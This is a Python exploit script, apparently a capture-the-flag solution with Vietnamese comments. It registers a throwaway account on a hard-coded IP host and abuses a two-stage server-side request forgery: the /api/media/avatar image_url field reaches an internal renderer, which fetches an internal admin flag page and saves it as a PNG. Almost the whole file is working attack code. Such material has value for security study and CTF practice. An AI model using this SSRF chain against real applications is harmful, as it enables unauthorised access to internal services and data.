#!/usr/bin/env python3
# threads — SSRF 2 tầng qua /api/media/avatar + renderer nội bộ.
import json, urllib.request, http.cookiejar, random

B = "http://103.116.52.180:1410"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def register():
    u = "u%d" % random.randint(1000, 99999)
    r = urllib.request.Request(B + "/api/auth/register",
        data=json.dumps({"username": u, "email": u + "@x.com", "password": "secret123"}).encode(),
        headers={"Content-Type": "application/json"})
    op.open(r, timeout=15)

def ssrf(url):
    """Trả về bytes response của /api/media/avatar cho image_url = url."""
    r = urllib.request.Request(B + "/api/media/avatar",
        data=json.dumps({"image_url": url}).encode(),
        headers={"Content-Type": "application/json"})
    return op.open(r, timeout=60).read()

register()

# Tầng 1: SSRF tới asset service; body lỗi leak preview 512 byte
#   / -> banner -> /robots.txt -> Disallow: /render-help
#   /render-help -> renderer nội bộ GET /render?url=  (chụp trang thành PNG)
# Tầng 2: dùng renderer để chụp trang admin nội bộ -> PNG chứa flag
data = ssrf("http://threads-assets:8080/render?url=http://threads-admin:5000/internal/flag")
open("flag_render.png", "wb").write(data)
print("Đã lưu flag_render.png (PNG chứa flag), mở ra đọc.")
